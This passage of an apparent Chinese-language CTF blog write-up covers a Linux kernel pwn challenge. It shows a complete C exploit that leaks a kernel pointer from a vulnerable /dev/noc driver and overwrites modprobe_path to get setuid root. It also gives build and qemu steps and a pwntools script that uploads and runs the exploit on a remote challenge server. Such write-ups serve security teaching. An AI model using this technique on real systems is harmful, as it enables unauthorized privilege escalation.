+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">get_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">target_sym</span> <span class="o">=</span> <span class="nf">get_kernel_sym</span><span class="p">(</span><span class="s">&#34;modprobe_path&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">dev_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/noc&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dev_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">leak_data_t</span> <span class="n">leak</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mh">0x83170405</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kern_buf</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">mem_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">padding</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">padding</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">target_sym</span> <span class="o">-</span> <span class="n">kern_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">base_addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">rel_pos</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">end_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">exploit_buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exploit_buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">exploit_buf</span> <span class="o">+</span> <span class="mi">7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">end_addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">exploit_buf</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">exploit_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">hijack_path</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">hijack_path</span><span class="p">,</span> <span class="s">&#34;/tmp/s&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="n">rel_pos</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">hijack_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hijack_path</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">create_helper</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    	<span class="s">&#34;/tmp/s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;#!/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    	<span class="s">&#34;chown root:root /tmp/exp</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;chmod 4755 /tmp/exp</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">exec_trigger</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/tmp/exp&#34;</span><span class="p">,</span> <span class="s">&#34;exp&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>编译：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#使用musl-gcc并剥离符号减少程序体积</span>
+</span></span><span class="line"><span class="cl">musl-gcc -o exp exp.c -static -Os
+</span></span><span class="line"><span class="cl">strip exp
+</span></span></code></pre></div><ul>
+<li>利用：</li>
+</ul>
+<p>将<code>exp</code>放入文件系统并重打包。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mv exp ./rootfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ./rootfs
+</span></span><span class="line"><span class="cl">find . -print0 <span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc &gt; ../exp.cpio
+</span></span></code></pre></div><p>然后修改启动脚本加载的文件系统为<code>exp.cpio</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel ./bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd  ./exp.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s2">&#34;root=/dev/ram rdinit=/init console=ttyS0 oops=panic panic=1 quiet rodata=off &#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu qemu64,+smep,+smap <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">1</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -snapshot
+</span></span></code></pre></div><p>执行<code>exp</code>然后成功拿到 flag：</p>
+<p><img alt="image-20260102164125272" decoding="async" loading="lazy" src="./assets/image-20260102164125272.png" style="max-width: 100%; height: auto;"></p>
+<p>最后附上一个打远程的脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">gzip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./exp&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">binary_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">compressed</span> <span class="o">=</span> <span class="n">gzip</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">binary_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">b64_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">compressed</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">b64_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">76</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b64_data</span><span class="p">),</span> <span class="mi">76</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;39.106.73.70&#34;</span><span class="p">,</span> <span class="mi">30087</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/ $&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cat &gt; /tmp/exp.gz.b64 &lt;&lt; &#34;EOF&#34;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;EOF&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/ $&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;base64 -d /tmp/exp.gz.b64 | gunzip &gt; /tmp/exp&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/ $&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;chmod +x /tmp/exp&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/ $&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/tmp/exp&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="后言">后言<a hidden class="anchor" aria-hidden="true" href="#后言">#</a></h2>
+<p>由于这个<a href="https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04">补丁</a>被合并到上游内核，导致覆盖<code>modprobe_path</code>这个利用方法在新版本内核中作废了。</p>
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">Linux 内核利用技术：覆盖modprobe_path - Midas 的博客</a>
+<a href="https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch">复兴modprobe_path技术：克服search_binary_handler（）补丁 - Theori BLOG</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
